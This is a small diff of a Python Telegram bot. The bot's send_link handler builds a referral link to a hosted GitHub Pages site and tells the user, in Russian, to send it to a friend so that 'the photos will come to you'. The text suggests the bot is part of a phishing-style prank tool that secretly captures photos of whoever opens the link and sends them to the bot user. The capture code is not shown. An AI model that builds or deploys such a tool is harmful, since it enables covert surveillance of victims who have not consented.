@@ -14,6 +14,7 @@ def send_link(message):
     chat_id = message.chat.id
     # Replace with your hosted site URL, for local testing use localhost
     site_url = 'https://damnzzq.github.io/info'  # Change to your hosted URL
+
     link = f'{site_url}?ref={chat_id}'
     bot.send_message(chat_id, f'Вот ссылка для прикола: {link}\nОтправь её другу, и фото придут тебе!')
 
